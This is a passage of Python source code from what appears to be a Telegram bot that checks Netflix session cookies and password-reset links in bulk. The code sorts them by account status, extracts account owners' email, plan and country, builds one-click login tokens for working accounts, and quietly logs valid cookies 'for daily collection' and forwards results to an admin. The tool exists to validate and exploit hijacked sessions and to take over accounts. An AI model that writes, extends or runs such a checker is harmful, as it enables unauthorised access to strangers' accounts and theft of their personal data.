                if cancellation_flags.get(user_id, False):
                    break
                await _process_batch(batch, is_retry=True)

        # Send separate result files
        result_files = await send_separate_result_files(
            context.bot,
            user_id,
            working_lines,
            hold_lines,
            non_working_results,
            "One_By_One"
        )

        final_message = f"✅ **One-by-one processing complete!**\n\n- Active Sent: {len(working_lines)}\n- On Hold Sent: {len(hold_lines)}\n- Expired/Invalid: {len(non_working_results)}\n- Total Processed: {processed}"
        if cancellation_flags.get(user_id, False):
            final_message = f"❌ **Processing Cancelled!**\n\n- Active Sent: {len(working_lines)}\n- On Hold Sent: {len(hold_lines)}\n- Expired/Invalid: {len(non_working_results)}\n- Total Processed: {processed}"

        keyboard = [[InlineKeyboardButton("🏠 Back to Start", callback_data="back_to_start")]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await telegram_call_with_retries(progress_msg.edit_text, text=final_message, parse_mode='Markdown', reply_markup=reply_markup)

        # Retrieve original_filename for admin notification
        file_record = get_pending_file_record(file_id)
        original_filename = file_record.get('original_filename') if file_record else None

        admin_summary = f"<b>One-by-One Check Complete!</b>\n- Active Sent: {len(working_lines)}\n- On Hold: {len(hold_lines)}\n- Expired/Invalid: {len(non_working_results)}\n- Total Processed: {processed}"
        await notify_admin_of_file_check(context, update.effective_user, file_path, admin_summary, original_filename, result_files)

        # Cleanup result files
        for path in result_files:
            if os.path.exists(path):
                os.unlink(path)

    except (OSError, RuntimeError, TelegramError) as e:
        logger.error(f"Error in one-by-one processing: {e}")
        await telegram_call_with_retries(progress_msg.edit_text, text="❌ An error occurred during one-by-one processing.")
    finally:
        if entered_queue:
            await leave_file_processing_queue(user_id)
        remove_pending_file(file_id)
        if user_id in cancellation_flags:
            del cancellation_flags[user_id]
        if os.path.exists(file_path):
            os.unlink(file_path)


async def process_file_one_by_one(query, context, file_id, user_id):
    """Processes cookies from a file and sends results for each valid cookie one by one."""
    file_data = get_pending_file(file_id)
    if not file_data or file_data[0] != user_id:
        await telegram_call_with_retries(query.edit_message_text, text="❌ File not found, expired, or unauthorized.")
        return

    _, file_path = file_data
    mark_pending_file_status(file_id, "processing")
    increment_file_checks(user_id)

    progress_msg = await telegram_call_with_retries(query.edit_message_text, text="🔄 Preparing one-by-one check...")

    non_working_results = []
    working_lines = []
    hold_lines = []
    cancellation_flags[user_id] = False
    entered_queue = False

    try:
        entered_queue = await enter_file_processing_queue(user_id, progress_msg, "one-by-one check")
        if not entered_queue:
            return

        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = split_cookie_records(f.read())

        total_lines = len([line for line in lines if line.strip()])
        processed = 0
        start_time = time.time()
        last_update_time = time.time()
        retry_queue = []

        async def _process_batch(batch, is_retry=False):
            nonlocal processed, working_lines, hold_lines, last_update_time
            batch_tasks = []
            for line in batch:
                line = line.strip()
                if not line:
                    continue
                batch_tasks.append(_run_cookie_worker(user_id, process_full_cycle_for_one_by_one, line, user_id))

            if not batch_tasks:
                return

            batch_results = await asyncio.gather(*batch_tasks, return_exceptions=True)

            for i, result in enumerate(batch_results):
                if result is None:
                    continue
                
                status, cookie_data, info_data = result

                if status == "Error" and not is_retry:
                    retry_queue.append(batch[i])
                    continue

                processed += 1

                if status == "Active":
                    working_lines.append(f"{cookie_data} | {info_data.get('formatted_info', '')}")
                    formatted_info = info_data.get('formatted_info', '')
                    raw_cookie = info_data.get('raw_cookie', '')
                    reply_markup = build_login_keyboard(info_data.get('nftoken'))
                    final_msg_text = f"🍪 <b>Cookie:</b>\n<code>{html.escape(raw_cookie)}</code>\n\n{formatted_info}"
                    await telegram_call_with_retries(
                        context.bot.send_message, chat_id=user_id, text=final_msg_text,
                        parse_mode='HTML', disable_web_page_preview=True, reply_markup=reply_markup,
                    )
                    await asyncio.sleep(0.5)
                elif status == "Hold":
                    hold_lines.append(f"{cookie_data} | {info_data.get('formatted_info', '')}")
                    formatted_info = info_data.get('formatted_info', '')
                    raw_cookie = info_data.get('raw_cookie', '')
                    reply_markup = build_login_keyboard(info_data.get('nftoken'))
                    final_msg_text = f"🍪 <b>Cookie (On Hold):</b>\n<code>{html.escape(raw_cookie)}</code>\n\n{formatted_info}"
                    await telegram_call_with_retries(
                        context.bot.send_message, chat_id=user_id, text=final_msg_text,
                        parse_mode='HTML', disable_web_page_preview=True, reply_markup=reply_markup,
                    )
                    await asyncio.sleep(0.5)
                else:
                    error_reason = info_data.get('error', 'Unknown Error')
                    non_working_results.append(f"{batch[i]} | {error_reason}")

            if time.time() - last_update_time > 5 or processed == total_lines:
                elapsed = time.time() - start_time
                avg_time = elapsed / processed if processed else 0
                remaining = (total_lines - processed) * avg_time
                eta_str = format_duration(remaining) if remaining < 3600 else f"{remaining/60:.1f}m"
                progress_bar = create_progress_bar(processed, total_lines)
                status_label = "🔄 Retrying failed checks" if is_retry else "📊 Processing cookies one-by-one"
                
                try:
                    await telegram_call_with_retries(
                        progress_msg.edit_text,
                        text=f"{status_label}...\n{progress_bar}\n"
                             f"ETA: {eta_str}\n\n"
                             f"✅ Active: {len(working_lines)}\n"
                             f"⚠️ On Hold: {len(hold_lines)}\n"
                             f"🔴 Expired/Invalid: {len(non_working_results)}\n"
                             f"🔁 To Retry: {len(retry_queue)}",
                        reply_markup=get_cancel_markup(user_id)
                    )
                except TelegramError as e:
                    logger.warning(f"Could not edit progress message: {e}")
                last_update_time = time.time()

            return True

        batch_size = 3
        line_batches = [lines[i:i + batch_size] for i in range(0, len(lines), batch_size)]

        for batch in line_batches:
            if cancellation_flags.get(user_id, False):
                logger.info(f"Processing cancelled by user {user_id}")
                break
            await _process_batch(batch, is_retry=False)
                
        if retry_queue and not cancellation_flags.get(user_id, False):
            await asyncio.sleep(2)
            retry_batches = [retry_queue[i:i + batch_size] for i in range(0, len(retry_queue), batch_size)]
            for batch in retry_batches:
                if cancellation_flags.get(user_id, False):
                    break
                await _process_batch(batch, is_retry=True)

        # Send separate result files
        result_files = await send_separate_result_files(
            context.bot,
            user_id,
            working_lines,
            hold_lines,
            non_working_results,
            "One_By_One"
        )

        final_message = f"✅ **One-by-one processing complete!**\n\n- Active Sent: {len(working_lines)}\n- On Hold Sent: {len(hold_lines)}\n- Expired/Invalid: {len(non_working_results)}\n- Total Processed: {processed}"
        if cancellation_flags.get(user_id, False):
            final_message = f"❌ **Processing Cancelled!**\n\n- Active Sent: {len(working_lines)}\n- On Hold Sent: {len(hold_lines)}\n- Expired/Invalid: {len(non_working_results)}\n- Total Processed: {processed}"

        keyboard = [[InlineKeyboardButton("🏠 Back to Start", callback_data="back_to_start")]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await telegram_call_with_retries(progress_msg.edit_text, text=final_message, parse_mode='Markdown', reply_markup=reply_markup)

        admin_summary = f"<b>One-by-One Check Complete!</b>\n- Active Sent: {len(working_lines)}\n- On Hold: {len(hold_lines)}\n- Expired/Invalid: {len(non_working_results)}\n- Total Processed: {processed}"
        await notify_admin_of_file_check(context, query.from_user, file_path, admin_summary, result_file_paths=result_files)

        # Cleanup
        for path in result_files:
            if os.path.exists(path):
                os.unlink(path)

    except (OSError, RuntimeError, TelegramError) as e:
        logger.error(f"Error in one-by-one processing: {e}")
        await telegram_call_with_retries(progress_msg.edit_text, text="❌ An error occurred during one-by-one processing.")
    finally:
        if entered_queue:
            await leave_file_processing_queue(user_id)
        remove_pending_file(file_id)
        if user_id in cancellation_flags:
            del cancellation_flags[user_id]
        if os.path.exists(file_path):
            os.unlink(file_path)


def process_full_cycle_for_one_by_one(line, user_id):
    """
    Runs the FULL cycle (detection -> loading -> request) inside the thread.
    Returns: (status_code, cookie_part, info_dict)
    """
    try:
        extractor = NetflixAccountInfoExtractor()

        extractor.detect_email_password(line)

        candidates = get_cookie_candidates(line)

        valid_found = False
        valid_cookie_part = ""

        if not candidates:
            record_check_metric(user_id, "unknown")
            return "Invalid", line, {'error': "🔴 Category: Expired/Invalid | Invalid Cookie Format"}

        for cookie_part in candidates:
            cookie_loaded = extractor.load_cookies_from_input(cookie_part)
            if not cookie_loaded:
                continue

            if extractor.check_cookies_validity():
                valid_found = True
                valid_cookie_part = cookie_part
                break

        if not valid_found:
            record_check_metric(user_id, "expired")
            return "Invalid", candidates[0], {'error': "🔴 Category: Expired/Invalid | Invalid/Expired Cookie"}

        # Log the valid cookie for daily collection
        log_cookie_for_daily(valid_cookie_part)

        extractor.get_nftoken(valid_cookie_part)

        if extractor.get_account_info(valid_cookie_part, fetch_nftoken=False):
            account_status = extractor.account_data.get('AccountStatus', 'Unknown')
            nftoken = extractor.nftoken_info.get('token')
            record_check_metric(user_id, account_status)
            if account_status == 'Active':
                formatted = extractor.format_account_info()
                return "Active", valid_cookie_part, {
                    'formatted_info': formatted,
                    'raw_cookie': valid_cookie_part,
                    'nftoken': nftoken,
                }
            elif account_status == 'Hold':
                formatted = extractor.format_account_info()
                return "Hold", valid_cookie_part, {
                    'formatted_info': formatted,
                    'raw_cookie': valid_cookie_part,
                    'nftoken': nftoken,
                }
            else:
                return "Inactive", valid_cookie_part, {'error': f"🔴 Category: Expired | Status: {account_status}"}
        else:
            record_check_metric(user_id, "unknown")
            return "Error", valid_cookie_part, {'error': "🔴 Category: Expired/Invalid | Failed to Extract Account Info"}

    except (KeyError, TypeError, ValueError) as e:
        logger.error(f"Error in full cycle thread: {e}")
        record_check_metric(user_id, "unknown")
        return "Error", line, {'error': f"❌ Exception: {str(e)}"}


# ---------- Reset Links File Processing (Enhanced) ----------
def estimate_reset_link_time(total_count: int) -> int:
    # Rough estimate: 10 seconds per link + overhead
    return total_count * 10 + 20


def _process_single_reset_link_worker(link: str):
    """Worker function to process a single reset link in a background thread."""
    try:
        extractor = NetflixAccountInfoExtractor()
        token, final_url = extractor.follow_reset_link_and_get_token(link)
        if not token:
            return link, "Failed", f"{link} | No token extracted"

        if not extractor.load_session_from_nftoken(token):
            return link, "Failed", f"{link} | Failed to load session"

        if not extractor.get_account_info(fetch_nftoken=False):
            return link, "Failed", f"{link} | Could not fetch account info"

        status = extractor.account_data.get('AccountStatus', 'Unknown')
        email = extractor.account_data.get('Email', 'N/A')
        plan = extractor.account_data.get('Plan', 'N/A')
        country = extractor.account_data.get('Country', 'N/A')
        member_since = extractor.account_data.get('MemberSince', 'N/A')
        screens = extractor.account_data.get('MaxStreams', 'N/A')
        info_str = f"Email: {email} | Plan: {plan} | Country: {country} | Member Since: {member_since} | Screens: {screens}"

        if status.lower() == 'active':
            return link, "Active", f"{link} | {info_str}"
        elif status.lower() in ('hold', 'on hold'):
            return link, "Hold", f"{link} | {info_str}"
        else:
            return link, "Failed", f"{link} | Status: {status} | {info_str}"
    except Exception as e:
        return link, "Failed", f"{link} | Error: {str(e)}"


async def process_reset_links_file(update, context, file_id, user_id):
    """Process a file containing reset links, sending results as a file with three categories."""
    file_data = get_pending_file(file_id)
    if not file_data or file_data[0] != user_id:
        await update.message.reply_text("❌ File not found, expired, or unauthorized.")
        return

    _, file_path = file_data
    mark_pending_file_status(file_id, "processing")
    increment_file_checks(user_id)

    progress_msg = await telegram_call_with_retries(
        context.bot.send_message,
        chat_id=user_id,
        text="🔄 Preparing reset links...",
    )

    cancellation_flags[user_id] = False
    entered_queue = False
    start_time = time.time()

    try:
        entered_queue = await enter_file_processing_queue(user_id, progress_msg, "reset links check")
        if not entered_queue:
            return

        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip()]

        # Deduplicate by nftoken
        seen_tokens = set()
        unique_links = []
        for line in lines:
            token = extract_nftoken_from_text(line)
            if token and token not in seen_tokens:
                seen_tokens.add(token)
                unique_links.append(line)
            elif not token:
                unique_links.append(line)  # keep lines without token, but they won't be processed

        total = len(unique_links)
        if total == 0:
            await progress_msg.edit_text("No valid reset links found.")
            return

        working_results = []      # Active
        partially_working = []    # Hold
        not_working = []          # Failed/Expired

        processed = 0
        last_update_time = time.time()

        async def _process_batch(batch):
            nonlocal processed, last_update_time
            # Safely wrap with _run_cookie_worker to respect the 50-worker limit
            tasks = [_run_cookie_worker(user_id, _process_single_reset_link_worker, link) for link in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for res in results:
                if res is None:  # Process was cancelled
                    continue
                processed += 1
                if isinstance(res, Exception):
                    logger.error(f"Error processing reset link worker: {res}")
                    not_working.append(f"Error processing link | {str(res)}")
                    continue
                
                link, status, info_str = res
                if status == "Active":
                    working_results.append(info_str)
                elif status == "Hold":
                    partially_working.append(info_str)
                else:
                    not_working.append(info_str)

                # Update progress
                if time.time() - last_update_time > 2 or processed == total:
                    elapsed = time.time() - start_time
                    avg_time = elapsed / processed if processed else 0
                    remaining = (total - processed) * avg_time
                    progress_bar = create_progress_bar(processed, total)
                    eta_str = format_duration(remaining) if remaining < 3600 else f"{remaining/60:.1f}m"
                    status_text = (
                        f"⏳ Processing reset links...\n{progress_bar}\n"
                        f"ETA: {eta_str}\n\n"
                        f"✅ Working: {len(working_results)}\n"
                        f"⚠️ On Hold: {len(partially_working)}\n"
                        f"❌ Not Working: {len(not_working)}"
                    )
                    try:
                        await telegram_call_with_retries(
                            progress_msg.edit_text, 
                            text=status_text, 
                            reply_markup=get_cancel_markup(user_id)
                        )
                    except TelegramError:
                        pass
                    last_update_time = time.time()

        batch_size = 3
        batches = [unique_links[i:i + batch_size] for i in range(0, len(unique_links), batch_size)]
        
        for batch in batches:
            if cancellation_flags.get(user_id, False):
                break
            await _process_batch(batch)

        # Send separate result files
        result_files = await send_separate_result_files(
            context.bot,
            user_id,
            working_results,
            partially_working,
            not_working,
            "Reset_Links"
        )

        final_msg = (
            f"✅ Reset links processing complete!\n\n"
            f"✅ Working (Active): {len(working_results)}\n"
            f"⚠️ On Hold: {len(partially_working)}\n"
            f"❌ Not Working: {len(not_working)}\n"
            f"Total processed: {processed}"
        )
        if cancellation_flags.get(user_id, False):
            final_msg = f"❌ Cancelled!\n\n" + final_msg

        keyboard = [[InlineKeyboardButton("🏠 Back to Start", callback_data="back_to_start")]]
        await progress_msg.edit_text(text=final_msg, reply_markup=InlineKeyboardMarkup(keyboard))

        # Admin notification
        file_record = get_pending_file_record(file_id)
        original_filename = file_record.get('original_filename') if file_record else None
        admin_summary = f"<b>Reset Links Check Complete!</b>\n- Working: {len(working_results)}\n- On Hold: {len(partially_working)}\n- Not Working: {len(not_working)}"
        await notify_admin_of_file_check(context, update.effective_user, file_path, admin_summary, original_filename, result_files)

        # Cleanup result files
        for path in result_files:
            if os.path.exists(path):
                os.unlink(path)

    except Exception as e:
        logger.error(f"Error in reset links processing: {e}")
        await progress_msg.edit_text("❌ An error occurred during reset links processing.")
    finally:
        if entered_queue:
            await leave_file_processing_queue(user_id)
        remove_pending_file(file_id)
        if user_id in cancellation_flags:
            del cancellation_flags[user_id]
        if os.path.exists(file_path):
            os.unlink(file_path)


async def process_cookie_file_quick_logic(file_path, user_id, progress_callback=None):
    """Quick check that sorts cookies into Valid, Hold, and Invalid files."""
    working_results, hold_results, non_working_results = [], [], []

    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = split_cookie_records(f.read())

        total_lines = len([line for line in lines if line.strip()])
        processed = 0
        start_time = time.time()
        last_update_time = time.time()

        retry_queue = []
        working_with_country = []
        hold_with_country = []

        async def _process_batch(batch, is_retry=False):
            nonlocal processed, last_update_time
            batch_tasks = []
            for line in batch:
                line = line.strip()
                if not line:
                    continue
                batch_tasks.append(_run_cookie_worker(user_id, process_single_cookie_line_quick, line, user_id))

            if not batch_tasks:
                return

            batch_results = await asyncio.gather(*batch_tasks, return_exceptions=True)

            for i, result in enumerate(batch_results):
                if result is None:
                    continue
                
                is_error = isinstance(result, Exception) or (isinstance(result, tuple) and len(result) >= 2 and result[1] == "Error")

                if is_error and not is_retry:
                    retry_queue.append(batch[i])
                    continue
                    
                processed += 1
                
                if isinstance(result, Exception):
                    logger.error(f"Error in quick check: {result}")
                    non_working_results.append(f"Error processing line: {str(result)}")
                else:
                    cookie_part, status, _country = result
                    result_entry = cookie_part

                    if status == 'Active':
                        working_with_country.append((result_entry, _country))
                    elif status == 'Hold':
                        hold_with_country.append((result_entry, _country))
                    else:
                        non_working_results.append(f"{cookie_part} | ❌ Status: {status}")

                if progress_callback and (time.time() - last_update_time > 2 or processed == total_lines):
                    elapsed = time.time() - start_time
                    avg_time = elapsed / processed if processed else 0
                    remaining = (total_lines - processed) * avg_time
                    eta_str = format_duration(remaining) if remaining < 3600 else f"{remaining/60:.1f}m"
                    progress_bar = create_progress_bar(processed, total_lines)
                    
                    status_label = "🔄 Retrying failed checks" if is_retry else "🔍 Checking cookies"
                    await progress_callback(
                        f"{status_label}...\n{progress_bar}\n"
                        f"ETA: {eta_str}\n\n"
                        f"✅ Active: {len(working_with_country)}\n"
                        f"⚠️ On Hold: {len(hold_with_country)}\n"
                        f"🔴 Expired/Invalid: {len(non_working_results)}\n"
                        f"🔁 To Retry: {len(retry_queue)}",
                        reply_markup=get_cancel_markup(user_id)
                    )
                    last_update_time = time.time()

        batch_size = 3
        line_batches = [lines[i:i + batch_size] for i in range(0, len(lines), batch_size)]

        for batch in line_batches:
            if cancellation_flags.get(user_id, False):
                logger.info(f"Processing cancelled by user {user_id}")
                break
            await _process_batch(batch, is_retry=False)

        if retry_queue and not cancellation_flags.get(user_id, False):
            await asyncio.sleep(2)
            retry_batches = [retry_queue[i:i + batch_size] for i in range(0, len(retry_queue), batch_size)]
            for batch in retry_batches:
                if cancellation_flags.get(user_id, False):
                    break
                await _process_batch(batch, is_retry=True)

        # Sorting results by country for Quick Check
        sorted_working_results = [item[0] for item in sorted(working_with_country, key=lambda x: str(x[1]))]
        sorted_hold_results = [item[0] for item in sorted(hold_with_country, key=lambda x: str(x[1]))]

        if progress_callback:
            status_text = "❌ Processing cancelled" if cancellation_flags.get(user_id, False) else "✅ Quick Check complete!"
            progress_bar = create_progress_bar(processed, total_lines)
            await progress_callback(
                f"{status_text}\n{progress_bar}\n\n"
                f"✅ Active: {len(sorted_working_results)}\n"
                f"⚠️ On Hold: {len(sorted_hold_results)}\n"
                f"🔴 Expired/Invalid: {len(non_working_results)}",
                reply_markup=None
            )

        return sorted_working_results, sorted_hold_results, non_working_results, processed
    except (OSError, TelegramError) as e:
        logger.error(f"Error processing file in quick check: {e}")
        return [], [], [], 0


def process_single_cookie_line_quick(line, user_id=None):
    """Quick check that also identifies 'Hold' status (runs in thread pool)"""
    try:
        extractor = NetflixAccountInfoExtractor()

        extractor.detect_email_password(line)

        candidates = get_cookie_candidates(line)

        valid_found = False
        valid_cookie_part = ""

        if not candidates:
            if user_id is not None:
                record_check_metric(user_id, "unknown")
            return line, "Invalid", "N/A"

        for cookie_part in candidates:
            cached = get_cached_result(cookie_part)
            if cached:
                if user_id is not None:
                    record_check_metric(user_id, cached.get('status', 'unknown'))
                return cookie_part, cached['status'], "N/A"

            cookie_loaded = extractor.load_cookies_from_input(cookie_part)
            if not cookie_loaded:
                continue

            if extractor.check_cookies_validity():
                valid_found = True
                valid_cookie_part = cookie_part
                break

        if not valid_found:
            if user_id is not None:
                record_check_metric(user_id, "expired")
            # FIX: Do NOT cache invalid results
            return candidates[0], "Invalid", "N/A"

        # Log the valid cookie for daily collection
        log_cookie_for_daily(valid_cookie_part)

        extractor.get_nftoken(valid_cookie_part)

        if extractor.get_account_info(valid_cookie_part, fetch_nftoken=False):
            account_status = extractor.account_data.get('AccountStatus', 'Invalid')
            country = extractor.account_data.get('Country', 'N/A')
            if user_id is not None:
                record_check_metric(user_id, account_status)

            set_cached_result(valid_cookie_part, {'info': "QuickCheck", 'status': account_status})

            if account_status == 'Active':
                return valid_cookie_part, "Active", country
            elif account_status == 'Hold':
                return valid_cookie_part, "Hold", country
            else:
                return valid_cookie_part, "Expired", country
        else:
            if user_id is not None:
                record_check_metric(user_id, "unknown")
            return valid_cookie_part, "Invalid", "N/A"

    except (KeyError, TypeError, ValueError) as e:
        logger.error(f"Error in quick check line: {e}")
        if user_id is not None:
            record_check_metric(user_id, "unknown")
        return line, "Error", "N/A"


async def process_file_full_check(query, context, file_id, user_id):
    file_data = get_pending_file(file_id)
    if not file_data or file_data[0] != user_id:
        await telegram_call_with_retries(query.edit_message_text, text="❌ File not found, expired, or unauthorized.")
        return

    _, file_path = file_data
    mark_pending_file_status(file_id, "processing")
    increment_file_checks(user_id)

    progress_msg = await telegram_call_with_retries(query.edit_message_text, text="🔄 Preparing full check (all at once)...")
    cancellation_flags[user_id] = False
    entered_queue = False

    async def update_progress(message, reply_markup=None):
        try:
            await telegram_call_with_retries(progress_msg.edit_text, text=message, reply_markup=reply_markup)
        except TelegramError as e:
            logger.warning(f"Could not update progress message: {e}")

    try:
        entered_queue = await enter_file_processing_queue(user_id, progress_msg, "full check")
        if not entered_queue:
            return

        working, hold, non_working, processed = await process_cookie_file_full_logic(file_path, user_id, update_progress)

        # Send separate result files
        result_files = await send_separate_result_files(
            context.bot,
            user_id,
            working,
            hold,
            non_working,
            "Full_Check"
        )

        final_msg = f"✅ **Processing Complete!**\n\n- Active: {len(working)}\n- On Hold: {len(hold)}\n- Expired/Invalid: {len(non_working)}\n- Total: {processed}"
        if cancellation_flags.get(user_id, False):
            final_msg = f"❌ **Processing Cancelled!**\n\n- Active: {len(working)}\n- On Hold: {len(hold)}\n- Expired/Invalid: {len(non_working)}\n- Total: {processed}"

        keyboard = [[InlineKeyboardButton("🏠 Back to Start", callback_data="back_to_start")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await telegram_call_with_retries(progress_msg.edit_text, text=final_msg, parse_mode='Markdown', reply_markup=reply_markup)

        admin_summary = f"<b>Full Check Complete!</b>\n- Active: {len(working)}\n- On Hold: {len(hold)}\n- Expired/Invalid: {len(non_working)}\n- Total: {processed}"
        await notify_admin_of_file_check(context, query.from_user, file_path, admin_summary, result_file_paths=result_files)

        # Cleanup
        for path in result_files:
            if os.path.exists(path):
                os.unlink(path)

    except (OSError, TelegramError, ValueError) as e:
        logger.error(f"Error sending full-check results: {e}")
        try:
            await telegram_call_with_retries(progress_msg.edit_text, text="❌ An error occurred while preparing the result files.")
        except TelegramError:
            logger.warning("Could not update failed full-check progress message.")
    finally:
        if entered_queue:
            await leave_file_processing_queue(user_id)
        remove_pending_file(file_id)
        if user_id in cancellation_flags:
            del cancellation_flags[user_id]
        if os.path.exists(file_path):
            os.unlink(file_path)


async def process_file_quick_check(query, context, file_id, user_id):
    file_data = get_pending_file(file_id)
    if not file_data or file_data[0] != user_id:
        await telegram_call_with_retries(query.edit_message_text, text="❌ File not found, expired, or unauthorized.")
        return

    _, file_path = file_data
    mark_pending_file_status(file_id, "processing")
    increment_file_checks(user_id)

    progress_msg = await telegram_call_with_retries(query.edit_message_text, text="⚡ Preparing quick check...")
    cancellation_flags[user_id] = False
    entered_queue = False

    async def update_progress(message, reply_markup=None):
        try:
            await telegram_call_with_retries(progress_msg.edit_text, text=message, reply_markup=reply_markup)
        except TelegramError as e:
            logger.warning(f"Could not update progress message: {e}")

    try:
        entered_queue = await enter_file_processing_queue(user_id, progress_msg, "quick check")
        if not entered_queue:
            return

        working, hold, non_working, processed = await process_cookie_file_quick_logic(file_path, user_id, update_progress)

        if not (working or hold or non_working):
            await telegram_call_with_retries(progress_msg.edit_text, text="No cookies found in the file.")
        else:
            # Send separate result files
            result_files = await send_separate_result_files(
                context.bot,
                user_id,
                working,
                hold,
                non_working,
                "Quick_Check"
            )

            # Cleanup result files after admin notification
            admin_summary = (
                f"<b>Quick Check Complete!</b>\n"
                f"- Active: {len(working)}\n"
                f"- On Hold: {len(hold)}\n"
                f"- Expired/Invalid: {len(non_working)}\n"
                f"- Total: {processed}"
            )
            await notify_admin_of_file_check(context, query.from_user, file_path, admin_summary, result_file_paths=result_files)

            for path in result_files:
                if os.path.exists(path):
                    os.unlink(path)

        final_msg = (
            f"⚡ <b>Quick Check Complete!</b>\n\n"
            f"- ✅ Active: {len(working)}\n"
            f"- ⚠️ On Hold: {len(hold)}\n"
            f"- 🔴 Expired/Invalid: {len(non_working)}\n"
            f"- Processed: {processed}"
        )
        if cancellation_flags.get(user_id, False):
            final_msg = (
                f"❌ <b>Processing Cancelled!</b>\n\n"
                f"- ✅ Active: {len(working)}\n"
                f"- ⚠️ On Hold: {len(hold)}\n"
                f"- 🔴 Expired/Invalid: {len(non_working)}\n"
                f"- Processed: {processed}"
            )

        keyboard = [[InlineKeyboardButton("🏠 Back to Start", callback_data="back_to_start")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await telegram_call_with_retries(progress_msg.edit_text, text=final_msg, parse_mode='HTML', reply_markup=reply_markup)

    except (OSError, TelegramError, ValueError) as e:
        logger.error(f"Error sending quick-check results: {e}")
        try:
            await telegram_call_with_retries(progress_msg.edit_text, text="❌ An error occurred while preparing the quick-check result files.")
        except TelegramError:
            logger.warning("Could not update failed quick-check progress message.")
    finally:
        if entered_queue:
            await leave_file_processing_queue(user_id)
        remove_pending_file(file_id)
        if user_id in cancellation_flags:
            del cancellation_flags[user_id]
        if os.path.exists(file_path):
            os.unlink(file_path)